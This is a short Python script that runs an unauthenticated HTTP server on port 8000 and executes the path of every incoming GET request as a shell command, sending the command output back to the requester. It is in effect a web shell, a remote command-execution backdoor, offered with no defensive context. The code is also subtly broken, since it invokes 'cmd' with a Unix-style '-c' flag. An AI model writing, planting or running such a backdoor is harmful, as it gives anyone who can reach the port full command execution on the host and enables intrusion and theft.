import os
import subprocess
from argparse import ArgumentParser
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, HTTPServer

def shellHTTPRequestHandler():

    class ShellHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            parsed_url = urlparse(self.path)
  
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(subprocess.check_output(['cmd', '-c', parsed_url.path[1:]]))

    return ShellHTTPRequestHandler

httpd = HTTPServer(('', 8000), shellHTTPRequestHandler())
httpd.serve_forever()
